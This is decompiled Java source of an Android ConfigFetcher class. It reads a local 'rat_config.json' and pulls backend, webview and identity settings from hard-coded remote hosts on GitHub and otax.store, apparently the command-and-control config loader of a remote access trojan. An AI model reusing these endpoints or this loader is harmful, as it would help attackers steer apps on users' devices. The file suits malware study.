/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.SharedPreferences
 *  android.content.SharedPreferences$Editor
 *  android.provider.Settings$Secure
 *  android.util.Log
 *  org.json.JSONObject
 */
package com.love.app;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.provider.Settings;
import android.util.Log;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.love.app.ConfigFetcher$$ExternalSyntheticLambda0;
import com.love.app.ConfigFetcher$$ExternalSyntheticLambda1;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.atomic.AtomicBoolean;
import org.json.JSONObject;

public class ConfigFetcher {
    private static final String GITHUB_URL = "https://raw.githubusercontent.com/OtaStoree/manta/main/config.json";
    private static final String KEY_APP_NAME = "app_name";
    private static final String KEY_BASE_URL = "base_url";
    private static final String KEY_LOGO_URL = "logo_url";
    private static final String KEY_SESSION_ID = "session_id";
    private static final String KEY_USERNAME = "username";
    private static final String KEY_WEBVIEW = "webview_url";
    private static final String PREF_NAME = "love_config";
    private static final String SERVER_URL = "http://nodemyayun.otax.store:2048/config.json";
    private static final String TAG = "ConfigFetcher";
    private static RequestQueue sQueue;

    public static void bootstrapConfig(Context context, ConfigListener configListener) {
        ConfigFetcher.loadLocalConfigSync(context);
        if (ConfigFetcher.hasUsableBaseUrl(context)) {
            configListener.onConfigLoaded(ConfigFetcher.getBaseUrl(context));
            if (!ConfigFetcher.hasIdentity(context)) {
                ConfigFetcher.fetchFromSourcesParallel(context, new ConfigListener(){

                    @Override
                    public void onConfigFailed() {
                        Log.d((String)ConfigFetcher.TAG, (String)"Identity config background update gagal.");
                    }

                    @Override
                    public void onConfigLoaded(String string2) {
                        Log.d((String)ConfigFetcher.TAG, (String)"Identity config dilengkapi di background.");
                    }
                });
            }
            return;
        }
        ConfigFetcher.loadConfig(context, configListener);
    }

    private static void fetchConfigUrl(Context object, String string2, String string3, ConfigListener configListener) {
        RequestQueue requestQueue = ConfigFetcher.getQueue((Context)object);
        StringBuilder stringBuilder = new StringBuilder().append(string2);
        String string4 = "?";
        if (string2.contains("?")) {
            string4 = "&";
        }
        object = new StringRequest(0, stringBuilder.append(string4).append("t=").append(System.currentTimeMillis()).toString(), new ConfigFetcher$$ExternalSyntheticLambda0((Context)object, configListener, string3), new ConfigFetcher$$ExternalSyntheticLambda1(string3, configListener));
        ((Request)object).setShouldCache(false);
        ((Request)object).setRetryPolicy(new DefaultRetryPolicy(6000, 0, 1.0f));
        requestQueue.add(object);
    }

    private static void fetchFromSourcesParallel(Context context, ConfigListener configListener) {
        Log.d((String)TAG, (String)"Fetch config paralel dimulai...");
        configListener = new ConfigListener(){
            final Context val$context;
            final AtomicBoolean val$delivered;
            final int[] val$failures;
            final ConfigListener val$listener;
            {
                this.val$delivered = atomicBoolean;
                this.val$listener = configListener;
                this.val$failures = nArray;
                this.val$context = context;
            }

            @Override
            public void onConfigFailed() {
                int n;
                Object object = this.val$failures;
                object[0] = n = object[0] + 1;
                if (n >= 2 && this.val$delivered.compareAndSet(false, true)) {
                    object = ConfigFetcher.getBaseUrl(this.val$context);
                    if (object != null && !((String)object).isEmpty()) {
                        this.val$listener.onConfigLoaded((String)object);
                    } else {
                        this.val$listener.onConfigFailed();
                    }
                }
            }

            @Override
            public void onConfigLoaded(String string2) {
                if (this.val$delivered.compareAndSet(false, true)) {
                    this.val$listener.onConfigLoaded(string2);
                }
            }
        };
        ConfigFetcher.fetchConfigUrl(context, GITHUB_URL, "GitHub", configListener);
        ConfigFetcher.fetchConfigUrl(context, SERVER_URL, "Server Node.js", configListener);
    }

    public static String getAppName(Context context) {
        return context.getSharedPreferences(PREF_NAME, 0).getString(KEY_APP_NAME, "App");
    }

    public static String getBaseUrl(Context context) {
        return context.getSharedPreferences(PREF_NAME, 0).getString(KEY_BASE_URL, null);
    }

    public static String getLogoUrl(Context context) {
        return context.getSharedPreferences(PREF_NAME, 0).getString(KEY_LOGO_URL, "");
    }

    private static RequestQueue getQueue(Context context) {
        if (sQueue == null) {
            sQueue = Volley.newRequestQueue(context.getApplicationContext());
        }
        return sQueue;
    }

    public static String getSessionId(Context context) {
        return context.getSharedPreferences(PREF_NAME, 0).getString(KEY_SESSION_ID, "");
    }

    public static String getUsername(Context context) {
        return context.getSharedPreferences(PREF_NAME, 0).getString(KEY_USERNAME, "");
    }

    public static String getWebviewUrl(Context context) {
        return context.getSharedPreferences(PREF_NAME, 0).getString(KEY_WEBVIEW, "");
    }

    private static boolean hasIdentity(Context context) {
        boolean bl = !ConfigFetcher.getUsername(context).trim().isEmpty() || !ConfigFetcher.getSessionId(context).trim().isEmpty();
        return bl;
    }

    private static boolean hasUsableBaseUrl(Context object) {
        boolean bl = (object = ConfigFetcher.getBaseUrl((Context)object)) != null && !((String)object).trim().isEmpty();
        return bl;
    }

    static /* synthetic */ void lambda$fetchConfigUrl$0(Context object, ConfigListener configListener, String string2, String string3) {
        try {
            JSONObject jSONObject = new JSONObject(string3);
            ConfigFetcher.saveRemoteFields((Context)object, jSONObject);
            object = ConfigFetcher.sanitizeConfigValue((Context)object, KEY_BASE_URL, jSONObject.optString(KEY_BASE_URL, ""));
            if (!((String)object).isEmpty()) {
                configListener.onConfigLoaded((String)object);
            } else {
                object = new StringBuilder("base_url kosong dari ");
                Log.e((String)TAG, (String)((StringBuilder)object).append(string2).append(".").toString());
                configListener.onConfigFailed();
            }
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)("Error Parsing JSON " + string2 + ": " + exception.getMessage()));
            configListener.onConfigFailed();
        }
    }

    static /* synthetic */ void lambda$fetchConfigUrl$1(String string2, ConfigListener configListener, VolleyError volleyError) {
        Log.e((String)TAG, (String)("Volley Error dari " + string2 + ": " + volleyError.toString()));
        configListener.onConfigFailed();
    }

    public static void loadConfig(Context context, ConfigListener configListener) {
        ConfigFetcher.loadLocalConfigSync(context);
        String string2 = ConfigFetcher.getBaseUrl(context);
        if (string2 != null && !string2.isEmpty()) {
            configListener.onConfigLoaded(string2);
            ConfigFetcher.fetchFromSourcesParallel(context, new ConfigListener(){

                @Override
                public void onConfigFailed() {
                    Log.d((String)ConfigFetcher.TAG, (String)"Update background gagal, menggunakan cache lokal.");
                }

                @Override
                public void onConfigLoaded(String string2) {
                    Log.d((String)ConfigFetcher.TAG, (String)"Base URL diperbarui di background.");
                }
            });
        } else {
            ConfigFetcher.fetchFromSourcesParallel(context, configListener);
        }
    }

    public static void loadLocalConfigSync(Context context) {
        Object object;
        Object object2;
        block6: {
            object2 = context.getExternalFilesDir(null);
            if (object2 == null) break block6;
            try {
                object = new File((File)object2, "rat_config.json");
                if (((File)object).exists()) {
                    object2 = new byte[(int)((File)object).length()];
                    FileInputStream fileInputStream = new FileInputStream((File)object);
                    fileInputStream.read((byte[])object2);
                    fileInputStream.close();
                    object = new String((byte[])object2, StandardCharsets.UTF_8);
                    ConfigFetcher.saveLocalFields(context, (String)object);
                    Log.d((String)TAG, (String)"Config lokal berhasil dimuat dari Storage.");
                    return;
                }
            }
            catch (Exception exception) {
                Log.e((String)TAG, (String)("Gagal membaca config dari Storage: " + exception.getMessage()));
            }
        }
        try {
            object = context.getAssets().open("config.json");
            object2 = new byte[((InputStream)object).available()];
            ((InputStream)object).read((byte[])object2);
            ((InputStream)object).close();
            object = new String((byte[])object2, StandardCharsets.UTF_8);
            ConfigFetcher.saveLocalFields(context, (String)object);
            Log.d((String)TAG, (String)"Config lokal berhasil dimuat dari Assets.");
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)("Gagal membaca config dari Assets: " + exception.getMessage()));
        }
    }

    private static void putIfEmpty(Context object, SharedPreferences object2, SharedPreferences.Editor editor, JSONObject jSONObject, String string2, String string3) {
        object = ConfigFetcher.sanitizeConfigValue((Context)object, string2, jSONObject.optString(string2, ""));
        object2 = object2.getString(string3, "");
        if (!((String)object).isEmpty() && (object2 == null || ((String)object2).trim().isEmpty())) {
            editor.putString(string3, (String)object);
        }
    }

    private static void putIfPresent(Context object, SharedPreferences.Editor editor, JSONObject jSONObject, String string2, String string3) {
        if (!((String)(object = ConfigFetcher.sanitizeConfigValue((Context)object, string2, jSONObject.optString(string2, "")))).isEmpty()) {
            editor.putString(string3, (String)object);
        }
    }

    private static String sanitizeConfigValue(Context object, String string2, String string3) {
        block11: {
            block10: {
                if ((string3 = string3 == null ? "" : string3.trim()).isEmpty()) {
                    return "";
                }
                String string4 = string3;
                if (KEY_BASE_URL.equals(string2)) {
                    String string5 = string3.toLowerCase();
                    if (!(string5.contains("your-backend-url") || string5.equals("https://") || string5.equals("http://"))) {
                        string4 = string3;
                        if (!string5.startsWith("http://")) {
                            string4 = string3;
                            if (!string5.startsWith("https://")) {
                                string4 = "http://" + string3;
                            }
                        }
                        string4 = string4.replaceAll("/+$", "");
                    } else {
                        return "";
                    }
                }
                if (!KEY_SESSION_ID.equals(string2) && !"session".equals(string2) && !KEY_USERNAME.equals(string2) || !string4.toLowerCase().startsWith("isi ") && !string4.isEmpty()) {
                    return string4;
                }
                string2 = Settings.Secure.getString((ContentResolver)object.getContentResolver(), (String)"android_id");
                if (string2 == null) break block10;
                object = string2;
                if (!string2.isEmpty()) break block11;
            }
            object = "uid" + System.currentTimeMillis() % 100000L;
        }
        return "guest_" + ((String)object).substring(Math.max(0, ((String)object).length() - 6));
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static void saveLocalFields(Context context, String string2) {
        try {
            JSONObject jSONObject = new JSONObject(string2);
            SharedPreferences sharedPreferences = context.getSharedPreferences(PREF_NAME, 0);
            SharedPreferences.Editor editor = sharedPreferences.edit();
            ConfigFetcher.putIfEmpty(context, sharedPreferences, editor, jSONObject, KEY_USERNAME, KEY_USERNAME);
            string2 = ConfigFetcher.sanitizeConfigValue(context, KEY_SESSION_ID, jSONObject.optString(KEY_SESSION_ID, jSONObject.optString("session", "")));
            String string3 = sharedPreferences.getString(KEY_SESSION_ID, "");
            if (!string2.isEmpty() && (string3 == null || string3.trim().isEmpty())) {
                editor.putString(KEY_SESSION_ID, string2);
            }
            ConfigFetcher.putIfEmpty(context, sharedPreferences, editor, jSONObject, KEY_WEBVIEW, KEY_WEBVIEW);
            ConfigFetcher.putIfEmpty(context, sharedPreferences, editor, jSONObject, KEY_APP_NAME, KEY_APP_NAME);
            ConfigFetcher.putIfEmpty(context, sharedPreferences, editor, jSONObject, KEY_LOGO_URL, KEY_LOGO_URL);
            editor.apply();
            return;
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)("Gagal menyimpan field config lokal: " + exception.getMessage()));
        }
    }

    private static void saveRemoteFields(Context context, JSONObject jSONObject) {
        try {
            SharedPreferences.Editor editor = context.getSharedPreferences(PREF_NAME, 0).edit();
            ConfigFetcher.putIfPresent(context, editor, jSONObject, KEY_BASE_URL, KEY_BASE_URL);
            ConfigFetcher.putIfPresent(context, editor, jSONObject, KEY_USERNAME, KEY_USERNAME);
            String string2 = ConfigFetcher.sanitizeConfigValue(context, KEY_SESSION_ID, jSONObject.optString(KEY_SESSION_ID, jSONObject.optString("session", "")));
            if (!string2.isEmpty()) {
                editor.putString(KEY_SESSION_ID, string2);
            }
            ConfigFetcher.putIfPresent(context, editor, jSONObject, KEY_WEBVIEW, KEY_WEBVIEW);
            ConfigFetcher.putIfPresent(context, editor, jSONObject, KEY_APP_NAME, KEY_APP_NAME);
            ConfigFetcher.putIfPresent(context, editor, jSONObject, KEY_LOGO_URL, KEY_LOGO_URL);
            editor.apply();
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)("Gagal menyimpan field config remote: " + exception.getMessage()));
        }
    }

    public static void setSessionId(Context context, String string2) {
        context.getSharedPreferences(PREF_NAME, 0).edit().putString(KEY_SESSION_ID, string2).apply();
    }

    public static void setUsername(Context context, String string2) {
        context.getSharedPreferences(PREF_NAME, 0).edit().putString(KEY_USERNAME, string2).apply();
    }

    public static interface ConfigListener {
        public void onConfigFailed();

        public void onConfigLoaded(String var1);
    }
}

